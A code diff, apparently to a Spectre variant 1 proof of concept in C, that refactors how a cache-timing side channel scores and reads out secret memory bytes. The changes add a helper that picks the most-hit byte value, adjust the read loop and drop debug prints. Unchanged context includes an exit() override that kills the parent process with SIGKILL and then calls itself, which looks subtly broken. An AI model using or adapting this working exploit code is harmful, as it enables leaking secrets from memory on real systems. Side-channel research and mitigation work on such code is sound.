@@ -23,7 +23,6 @@ void exit(int status);
 
 void exit(int status)
 {
-	// kill the parent
 	kill(getppid(), SIGKILL);
 	exit(status);
 }
@@ -44,6 +43,19 @@ void victim_function(size_t x)
 	{
 		temp &= array2[array1[x] * 512];
 	}
+}
+
+static inline uint8_t get_max_value()
+{
+	int max = -1;
+	for (int i = 0; i < 256; i++)
+	{
+		if (max < 0 || results[i] > results[max])
+		{
+			max = i;
+		}
+	}
+	return max;
 }
 
 uint8_t probe_memory_byte(size_t offset)
@@ -93,15 +105,8 @@ uint8_t probe_memory_byte(size_t offset)
 			if ((int)time <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
 				results[mix_i]++; /* cache hit -> score +1 for this value */
 		}
-
-		for (i = 0; i < 256; i++)
-		{
-			if (ret < 0 || results[i] >= results[ret])
-				ret = i;
-		}
-		printf("tries: %d\n", tries);
 	}
-	return ret;
+	return get_max_value();
 }
 
 int main(int argc, char **argv)
@@ -116,9 +121,8 @@ int main(int argc, char **argv)
 
 	printf("secret_ptr: %p, size: %d, array1: %p ,offset %p\n", secret_ptr, size, array1, offset);
 
-	while (--size)
+	while (size--)
 	{
-		printf("Reading at secret_ptr + %d... ", size);
 		res = probe_memory_byte(offset++);
 		printf("Reading at offset %p -> value: %c(0x%x)\n",
 					 offset, (res > 31 && res < 127) ? res : '?', res);
